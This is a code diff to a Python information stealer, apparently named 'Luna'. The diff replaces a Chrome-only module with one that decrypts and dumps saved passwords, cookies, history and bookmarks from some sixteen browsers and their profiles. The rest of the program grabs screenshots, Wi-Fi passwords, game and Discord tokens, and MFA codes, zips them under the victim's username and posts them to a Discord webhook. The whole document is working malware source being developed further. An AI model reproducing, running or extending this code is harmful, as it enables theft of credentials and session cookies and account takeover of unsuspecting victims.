@@ -12,7 +12,6 @@ import json
 import base64
 
 from shutil import copy2
-from base64 import b64decode
 from sys import exit
 from zipfile import ZipFile
 from Crypto.Cipher import AES
@@ -27,7 +26,7 @@ __PINGTYPE__ = "%ping_type%"
 def main(webhook: str):
     webhook = SyncWebhook.from_url(webhook, session=requests.Session())
 
-    threads = [ss, chrome, grabwifi, mc_tokens, epicgames_data, mfa_codes]
+    threads = [browsers, ss, grabwifi, mc_tokens, epicgames_data, mfa_codes]
 
     for func in threads:
         process = threading.Thread(target=func, daemon=True)
@@ -303,6 +302,154 @@ class grabtokens():
             webhook.send(embed=embed, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
             self.tokens_sent += token
 
+@try_extract
+class browsers():
+    def __init__(self) -> None:
+        self.appdata = os.getenv('LOCALAPPDATA')
+        self.roaming = os.getenv('APPDATA')
+        self.browsers = {
+            'amigo': self.appdata + '\\Amigo\\User Data',
+            'torch': self.appdata + '\\Torch\\User Data',
+            'kometa': self.appdata + '\\Kometa\\User Data',
+            'orbitum': self.appdata + '\\Orbitum\\User Data',
+            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
+            '7star': self.appdata + '\\7Star\\7Star\\User Data',
+            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
+            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
+            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
+            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
+            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
+            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
+            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
+            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
+            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
+            'iridium': self.appdata + '\\Iridium\\User Data',
+        }
+
+        self.profiles = [
+            'Default',
+            'Profile 1',
+            'Profile 2',
+            'Profile 3',
+            'Profile 4',
+            'Profile 5',
+        ]
+
+        for name, path in self.browsers.items():
+            if not os.path.isdir(path):
+                continue
+
+            self.masterkey = self.get_master_key(path + '\\Local State')
+            self.funcs = [
+                self.cookies, 
+                self.history, 
+                self.passwords,
+                self.bookmarks
+                ]
+
+            for profile in self.profiles:
+                for func in self.funcs:
+                    try:
+                        func(name, path, profile)
+                    except:
+                        pass
+    
+    def get_master_key(self, path: str) -> str:
+            with open(path, "r", encoding="utf-8") as f:
+                c = f.read()
+            local_state = json.loads(c)
+
+            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+            master_key = master_key[5:]
+            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+            return master_key
+
+    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt(payload)
+        decrypted_pass = decrypted_pass[:-16].decode()
+        return decrypted_pass
+
+    def passwords(self, name: str, path: str, profile: str) -> None:
+        path += '\\' + profile + '\\Login Data'
+        if not os.path.isfile(path):
+            return
+        copy2(path, "Loginvault.db")
+        conn = sqlite3.connect("Loginvault.db")
+        cursor = conn.cursor()
+        with open('.\\browser-passwords.txt', 'a') as f:
+            for res in cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
+                url, username, password = res
+                password = self.decrypt_password(password, self.masterkey)
+                if url and username and password != "":
+                    f.write("Username: {:<40} Password: {:<40} URL: {}\n".format(
+                        username, password, url))
+                else:
+                    f.write("No passwords were found :(")
+        cursor.close()
+        conn.close()
+        os.remove("Loginvault.db")
+
+    def cookies(self, name: str, path: str, profile: str) -> None:
+        path += '\\' + profile + '\\Network\\Cookies'
+        if not os.path.isfile(path):
+            return
+        copy2(path, "Cookievault.db")
+        conn = sqlite3.connect("Cookievault.db")
+        cursor = conn.cursor()
+        with open('.\\browser-cookies.txt', 'a', encoding="utf-8") as f:
+            for res in cursor.execute("SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies").fetchall():
+                host_key, name, path, encrypted_value, expires_utc = res
+                value = self.decrypt_password(encrypted_value, self.masterkey)
+                if host_key and name and value != "":
+                    f.write("{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format(
+                        host_key, 'FALSE' if expires_utc == 0 else 'TRUE', path, 'FALSE' if host_key.startswith('.') else 'TRUE', expires_utc, name, value))
+                else:
+                    f.write("No cookies were found :(")
+        cursor.close()
+        conn.close()
+        os.remove("Cookievault.db")
+    
+    def history(self, name: str, path: str, profile: str) -> None:
+        path += '\\' + profile + '\\History'
+        if not os.path.isfile(path):
+            return
+        copy2(path, "Historyvault.db")
+        conn = sqlite3.connect("Historyvault.db")
+        cursor = conn.cursor()
+        with open('.\\browser-history.txt', 'a', encoding="utf-8") as f:
+            sites = []
+            for res in cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
+                url, title, visit_count, last_visit_time = res
+                if url and title and visit_count and last_visit_time != "":
+                    sites.append((url, title, visit_count, last_visit_time))
+            sites.sort(key=lambda x: x[3], reverse=True)
+            for site in sites:
+                f.write("Visit Count: {:<6} Title: {:<40}\n".format(site[2], site[1]))
+                
+        cursor.close()
+        conn.close()
+        os.remove("Historyvault.db")
+    
+    def bookmarks(self, name: str, path: str, profile: str) -> None:
+        path += '\\' + profile + '\\Bookmarks'
+        if not os.path.isfile(path):
+            return
+        copy2(path, 'browser-bookmarks.json')
+        with open('browser-bookmarks.json', 'r', encoding="utf-8") as f:
+            for item in json.loads(f.read())['roots']['bookmark_bar']['children']:
+                if 'children' in item:
+                    for child in item['children']:
+                        if 'url' in child:
+                            with open('.\\browser-bookmarks.txt', 'a', encoding="utf-8") as f:
+                                f.write("URL: {}\n".format(child['url']))
+                elif 'url' in item:
+                    with open('\\browser-bookmarks.txt', 'a', encoding="utf-8") as f:
+                        f.write("URL: {}\n".format(item['url']))
+        os.remove('bookmarks.json')
+
 def ss():
     ImageGrab.grab(
         bbox=None,
@@ -310,120 +457,6 @@ def ss():
         all_screens=True,
         xdisplay=None
     ).save("desktop-screenshot.png")
-
-@try_extract
-class chrome():
-    def __init__(self) -> None:
-        self.roaming = os.getenv('APPDATA')
-        self.local = os.getenv('LOCALAPPDATA')
-        self.masterkey = self.get_master_key()
-        self.google_paths = [
-            self.local + '\\Google\\Chrome\\User Data\\Default',
-            self.local + '\\Google\\Chrome\\User Data\\Profile 1',
-            self.local + '\\Google\\Chrome\\User Data\\Profile 2',
-            self.local + '\\Google\\Chrome\\User Data\\Profile 3',
-            self.local + '\\Google\\Chrome\\User Data\\Profile 4',
-            self.local + '\\Google\\Chrome\\User Data\\Profile 5',
-        ]
-
-        self.passwords()
-        self.cookies()
-        self.history()
-
-    def get_master_key(self):
-        with open(self.local + '\\Google\\Chrome\\User Data\\Local State', "r", encoding="utf-8") as f:
-            local_state = f.read()
-        local_state = json.loads(local_state)
-
-        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
-        master_key = master_key[5:]
-        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-        return master_key
-
-    def decrypt_password(self, buff, master_key):
-        try:
-            iv, payload = buff[3:15], buff[15:]
-            cipher = AES.new(master_key, AES.MODE_GCM, iv)
-            decrypted_pass = cipher.decrypt(payload)[:-16].decode()
-            return decrypted_pass
-        except Exception:
-            return "Chrome < 80"
-
-    def passwords(self):
-        google_pass = ".\\google-passwords.txt"
-        with open(google_pass, "w", encoding="utf-8") as f:
-            f.write(f"{github} | Google Chrome Passwords\n\n")
-
-        for path in self.google_paths:
-            path += '\\Login Data'
-            if os.path.exists(path):
-                copy2(path, "Loginvault.db")
-                conn = sqlite3.connect("Loginvault.db")
-                cursor = conn.cursor()
-                with open(google_pass, "a", encoding="utf-8") as f:
-                    for result in cursor.execute(
-                            "SELECT action_url, username_value, password_value FROM logins"):
-                        url, username, password = result
-                        password = self.decrypt_password(
-                            password, self.masterkey)
-                        if url and username and password != "":
-                            f.write(
-                                "Username: {:<30} | Password: {:<30} | Site: {:<30}\n".format(
-                                    username, password, url))
-                cursor.close()
-                conn.close()
-                os.remove("Loginvault.db")
-
-    def cookies(self):
-        google_cookies = ".\\google-cookies.txt"
-        with open(google_cookies, "w", encoding="utf-8") as f:
-            f.write(f"{github} | Google Chrome Cookies\n\n")
-
-        for path in self.google_paths:
-            path += '\\Network\\Cookies'
-            if os.path.exists(path):
-                copy2(path, "Cookievault.db")
-                conn = sqlite3.connect("Cookievault.db")
-                cursor = conn.cursor()
-                with open(google_cookies, "a", encoding="utf-8") as f:
-                    for result in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc from cookies"):
-                        host, name, path, value, expires_utc = result
-                        value = self.decrypt_password(value, self.masterkey)
-                        if host and name and value != "":
-                            f.write("{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format(
-                                host, 'FALSE' if expires_utc == 0 else 'TRUE', path, 'FALSE' if host.startswith('.') else 'TRUE', expires_utc, name, value))
-                cursor.close()
-                conn.close()
-                os.remove("Cookievault.db")
-
-    def history(self):
-        google_history = ".\\google-history.txt"
-        with open(google_history, "w", encoding="utf-8") as f:
-            f.write(f"{github} | Google Chrome History\n\n")
-    
-        for path in self.google_paths:
-            path += '\\History'
-            if os.path.exists(path):
-                copy2(path, "Historyvault.db")
-                conn = sqlite3.connect("Historyvault.db")
-                cursor = conn.cursor()
-                sites = []
-                with open(google_history, "a", encoding="utf-8") as f:
-                    for result in cursor.execute(
-                            "SELECT url, title, visit_count, last_visit_time FROM urls"):
-                        url, title, visit_count, last_visit_time = result
-                        if url and title and visit_count and last_visit_time != "":
-                            sites.append(
-                                (url, title, visit_count, last_visit_time))
-                        sites.sort(key=lambda x: x[3], reverse=True)
-                    for site in sites:
-                        f.write(
-                            "Occurrences: {:<4} | Site: {:<10}\n".format(
-                                site[2], site[1]))
-
-                cursor.close()
-                conn.close()
-                os.remove("Historyvault.db")
 
 @try_extract
 class grabwifi:
@@ -531,9 +564,14 @@ class mfa_codes():
 def zipup():
     with ZipFile(f'Luna-Logged-{os.getenv("Username")}.zip', 'w') as zipf:
         try:
-            zipf.write("google-passwords.txt")
-            zipf.write("google-cookies.txt")
-            zipf.write("google-history.txt")
+            zipf.write("browser-passwords.txt")
+            zipf.write("browser-cookies.txt")
+            zipf.write("browser-history.txt")
+            if os.path.exists("browser-bookmarks.txt"):
+                zipf.write("browser-bookmarks.txt")
+            else:
+                pass
+            zipf.write("browser-bookmarks.json")
             zipf.write("wifi-passwords.txt")
             zipf.write("minecraft-sessioninfo.json")
             zipf.write("minecraft-usercache.json")
@@ -545,9 +583,14 @@ def zipup():
 
 def cleanup():
     try:
-        os.remove("google-passwords.txt"),
-        os.remove("google-cookies.txt"),
-        os.remove("google-history.txt"),
+        os.remove("browser-passwords.txt"),
+        os.remove("browser-cookies.txt"),
+        os.remove("browser-history.txt"),
+        os.remove("browser-bookmarks.json"),
+        if os.path.exists("browser-bookmarks.txt"):
+            os.remove("browser-bookmarks.txt")
+        else:
+            pass
         os.remove("wifi-passwords.txt"),
         os.remove("minecraft-usercache.json"),
         os.remove("minecraft-sessioninfo.json"),
